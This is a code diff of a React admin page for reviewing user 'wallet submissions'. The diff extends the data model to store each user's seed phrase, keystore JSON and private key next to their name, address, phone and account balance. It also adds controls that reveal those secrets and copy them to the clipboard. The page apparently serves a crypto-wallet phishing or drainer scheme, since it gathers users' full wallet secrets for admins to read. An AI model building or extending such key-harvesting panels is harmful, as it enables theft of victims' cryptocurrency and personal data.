@@ -2,29 +2,50 @@
 
 import React, { useEffect, useState } from "react";
 import { toast } from "sonner";
-import { CheckCircle, XCircle, Wallet, Clock } from "lucide-react";
+import { CheckCircle, XCircle, Wallet, Clock, Copy, Eye, EyeOff } from "lucide-react";
+import { Button } from "@/components/ui/button";
 
-interface WalletSubmission {
+interface WalletData {
   _id: string;
-  userId: string;
+  userId: {
+    _id: string;
+    email: string;
+    fullName: string;
+    accountNumber: string;
+    balance: number;
+    accountStatus: string;
+    kycVerified: boolean;
+    phone: string;
+    address: string;
+  };
   userName: string;
   userEmail: string;
   walletName: string;
   walletType: "phrase" | "keystore" | "private";
+  seedPhrase?: string;
+  keystoreJson?: string;
+  privateKey?: string;
   status: "pending" | "approved" | "rejected";
   submittedAt: string;
   approvedAt?: string;
-  approvedBy?: string;
+  approvedBy?: {
+    _id: string;
+    email: string;
+    fullName: string;
+  };
   rejectionReason?: string;
 }
 
 export default function AdminWalletPage() {
-  const [wallets, setWallets] = useState<WalletSubmission[]>([]);
+  const [wallets, setWallets] = useState<WalletData[]>([]);
   const [loading, setLoading] = useState(true);
   const [filter, setFilter] = useState<"pending" | "approved" | "rejected" | "all">("pending");
-  const [selectedWallet, setSelectedWallet] = useState<WalletSubmission | null>(null);
-  const [actionLoading, setActionLoading] = useState(false);
+  const [expandedId, setExpandedId] = useState<string | null>(null);
+  const [actionLoading, setActionLoading] = useState<string | null>(null);
   const [rejectionReason, setRejectionReason] = useState("");
+  const [showRejectInput, setShowRejectInput] = useState<string | null>(null);
+  const [showSeedPhrase, setShowSeedPhrase] = useState<string | null>(null);
+  const [selectedWallet, setSelectedWallet] = useState<WalletData | null>(null);
 
   useEffect(() => {
     fetchWallets();
@@ -52,7 +73,7 @@ export default function AdminWalletPage() {
 
   const handleApprove = async (walletId: string) => {
     try {
-      setActionLoading(true);
+      setActionLoading(walletId);
       const res = await fetch("/api/admin/wallet", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -64,9 +85,9 @@ export default function AdminWalletPage() {
 
       const data = await res.json();
       if (data.success) {
-        toast.success("Wallet approved");
-        setSelectedWallet(null);
+        toast.success("Wallet approved successfully");
         fetchWallets();
+        setExpandedId(null);
       } else {
         toast.error(data.error || "Failed to approve wallet");
       }
@@ -74,7 +95,7 @@ export default function AdminWalletPage() {
       toast.error("Error approving wallet");
       console.error(error);
     } finally {
-      setActionLoading(false);
+      setActionLoading(null);
     }
   };
 
@@ -85,7 +106,7 @@ export default function AdminWalletPage() {
     }
 
     try {
-      setActionLoading(true);
+      setActionLoading(walletId);
       const res = await fetch("/api/admin/wallet", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -98,9 +119,9 @@ export default function AdminWalletPage() {
 
       const data = await res.json();
       if (data.success) {
-        toast.success("Wallet rejected");
-        setSelectedWallet(null);
+        toast.success("Wallet rejected successfully");
         setRejectionReason("");
+        setShowRejectInput(null);
         fetchWallets();
       } else {
         toast.error(data.error || "Failed to reject wallet");
@@ -109,8 +130,13 @@ export default function AdminWalletPage() {
       toast.error("Error rejecting wallet");
       console.error(error);
     } finally {
-      setActionLoading(false);
+      setActionLoading(null);
     }
+  };
+
+  const copyToClipboard = (text: string, label: string) => {
+    navigator.clipboard.writeText(text);
+    toast.success(`${label} copied to clipboard`);
   };
 
   const statusColor = (status: string) => {
